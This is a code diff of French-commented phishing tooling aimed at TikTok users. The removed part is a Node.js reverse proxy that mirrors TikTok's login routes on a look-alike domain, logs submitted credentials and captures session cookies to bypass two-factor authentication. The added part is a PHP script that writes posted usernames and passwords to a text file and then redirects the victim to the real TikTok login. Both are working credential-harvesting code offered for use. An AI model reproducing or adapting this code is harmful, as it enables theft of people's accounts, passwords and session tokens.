@@ -1,61 +1,28 @@
-const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
-const path = require('path');
+<?php
+// Vérifie si les données ont été envoyées via le formulaire
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
-const app = express();
-const PORT = process.env.PORT || 10000;
+    // 1. On récupère les données saisies
+    $identifiant = $_POST['identifiant'];
+    $motdepasse = $_POST['motdepasse'];
 
-// Sert ton interface personnalisée à la racine
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+    // 2. On prépare le texte à enregistrer
+    $donnees = "--- Nouvelle Connexion ---\n";
+    $donnees .= "Utilisateur : " . $identifiant . "\n";
+    $donnees .= "Mot de passe : " . $motdepasse . "\n";
+    $donnees .= "Date : " . date('d-m-Y H:i:s') . "\n";
+    $donnees .= "---------------------------\n\n";
 
-// Permet de charger les images locales
-app.use(express.static(path.join(__dirname)));
+    // 3. On enregistre dans un fichier appelé 'resultats.txt'
+    // FILE_APPEND permet d'ajouter les nouveaux textes à la suite des anciens
+    file_put_contents("resultats.txt", $donnees, FILE_APPEND);
 
-const proxyOptions = {
-    target: 'https://www.tiktok.com',
-    changeOrigin: true,
-    secure: true,
-    autoRewrite: true, // Réécrit les redirections pour rester sur ton domaine Render
-    followRedirects: true,
-    cookieDomainRewrite: {
-        ".tiktok.com": "noreplytiktok.onrender.com",
-        "tiktok.com": "noreplytiktok.onrender.com"
-    },
-    onProxyReq: (proxyReq, req, res) => {
-        // --- INTERCEPTION DES IDENTIFIANTS (POST) ---
-        if (req.method === 'POST') {
-            let body = '';
-            req.on('data', chunk => { body += chunk; });
-            req.on('end', () => {
-                if (body) {
-                    console.log("\n[!] DONNÉES POST CAPTURÉES :");
-                    console.log(decodeURIComponent(body));
-                    console.log("-------------------------------\n");
-                }
-            });
-        }
-        // Imitation d'un navigateur récent
-        proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
-    },
-    onProxyRes: (proxyRes, req, res) => {
-        // --- CAPTURE DES COOKIES DE SESSION (BYPASS 2FA) ---
-        const sc = proxyRes.headers['set-cookie'];
-        if (sc) {
-            console.log("\n[X] FLUX DE COOKIES DÉTECTÉ");
-            sc.forEach(cookie => {
-                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
-                    console.log(">>> JETON RÉCUPÉRÉ : " + cookie.split(';')[0]);
-                }
-            });
-        }
-    }
-};
-
-// On branche le proxy sur toutes les routes de connexion de TikTok
-app.use(['/login', '/passport', '/api', '/auth'], createProxyMiddleware(proxyOptions));
-
-app.listen(PORT, () => {
-    console.log("BACOPS PROXY : TUNNEL MIROIR ACTIF");
-});
+    // 4. Redirection vers le vrai site TikTok
+    header("Location: https://www.tiktok.com/login");
+    exit();
+} else {
+    // Si quelqu'un essaie d'accéder au fichier PHP directement, on le renvoie au formulaire
+    header("Location: index.php");
+    exit();
+}
+?>
